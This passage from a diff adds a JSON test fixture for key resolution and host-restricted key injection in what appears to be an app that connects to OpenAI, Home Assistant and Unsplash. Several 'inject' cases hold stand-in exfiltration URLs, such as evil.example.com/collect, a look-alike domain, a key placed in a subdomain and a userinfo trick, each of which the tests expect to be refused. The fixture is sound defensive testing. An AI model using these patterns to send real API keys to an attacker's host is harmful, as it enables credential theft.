+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "art",
+      "declared": [],
+      "path": [
+        "openAI",
+        "apiKey"
+      ]
+    },
+    {
+      "name": "the whole group",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "path": [
+        "homeAssistant"
+      ],
+      "value": {
+        "url": "http://ha.local:8123",
+        "accessToken": "ha-token"
+      }
+    },
+    {
+      "name": "no serviceKeys (a frame with no plane, an older plane): the settings",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "anything",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-default"
+    },
+    {
+      "name": "a key typed on the frame wins",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-typed",
+      "typedKeys": {
+        "openAI": {
+          "apiKey": "sk-typed"
+        }
+      }
+    },
+    {
+      "name": "a key typed on the frame never reaches a scene the owner refused",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "store-art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "typedKeys": {
+        "openAI": {
+          "apiKey": "sk-typed"
+        }
+      }
+    },
+    {
+      "name": "typed fields overlay the bound group",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "path": [
+        "homeAssistant"
+      ],
+      "value": {
+        "url": "http://ha.local:8123",
+        "accessToken": "typed"
+      },
+      "typedKeys": {
+        "homeAssistant": {
+          "accessToken": "typed"
+        }
+      }
+    },
+    {
+      "name": "an address typed on the frame takes its group whole: the plane's token never goes there",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "typedKeys": {
+        "homeAssistant": {
+          "url": "http://elsewhere.example:8123"
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "path": [
+        "homeAssistant"
+      ],
+      "value": {
+        "url": "http://elsewhere.example:8123"
+      }
+    },
+    {
+      "name": "a key typed on the frame is the frame's: every scene given that service gets it",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "work-art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-typed",
+      "typedKeys": {
+        "openAI": {
+          "apiKey": "sk-typed"
+        }
+      }
+    },
+    {
+      "name": "a key typed on the frame reaches a scene the plane does not know",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "typedKeys": {
+        "openAI": {
+          "apiKey": "sk-typed"
+        }
+      },
+      "scene": "made-on-the-frame",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-typed"
+    },
+    {
+      "name": "typed keys on a frame with no plane",
+      "settings": {},
+      "scene": "art",
+      "declared": [
+        "acme"
+      ],
+      "path": [
+        "acme",
+        "apiKey"
+      ],
+      "value": "typed",
+      "typedKeys": {
+        "acme": {
+          "apiKey": "typed"
+        }
+      }
+    },
+    {
+      "name": "no plane: an address typed takes the group whole there too",
+      "settings": {
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "from-frame-json"
+        }
+      },
+      "typedKeys": {
+        "homeAssistant": {
+          "url": "http://elsewhere.example:8123"
+        }
+      },
+      "scene": "x",
+      "declared": [
+        "homeAssistant"
+      ],
+      "path": [
+        "homeAssistant",
+        "accessToken"
+      ]
+    }
+  ],
+  "inject": [
+    {
+      "name": "header to a registry host",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/v1/images",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "expect": {
+        "url": "https://api.openai.com/v1/images",
+        "headers": {
+          "Authorization": "Bearer sk-default"
+        }
+      }
+    },
+    {
+      "name": "query to a registry host",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "work-art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/v1/x?key={{key:openAI.apiKey}}",
+      "headers": {},
+      "expect": {
+        "url": "https://api.openai.com/v1/x?key=sk-work",
+        "headers": {}
+      }
+    },
+    {
+      "name": "another host: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://evil.example.com/collect",
+      "headers": {
+        "X-K": "{{key:openAI.apiKey}}"
+      },
+      "refused": "host"
+    },
+    {
+      "name": "a registry host over http: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "http://api.openai.com/v1/images",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "refused": "host"
+    },
+    {
+      "name": "a look-alike host: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com.evil.example.com/",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "refused": "host"
+    },
+    {
+      "name": "in the authority: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://{{key:openAI.apiKey}}.evil.example.com/",
+      "headers": {},
+      "refused": "placement"
+    },
+    {
+      "name": "userinfo tricks: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com@evil.example.com/?k={{key:openAI.apiKey}}",
+      "headers": {},
+      "refused": "host"
+    },
+    {
+      "name": "hostsFrom: the URL field’s own origin",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
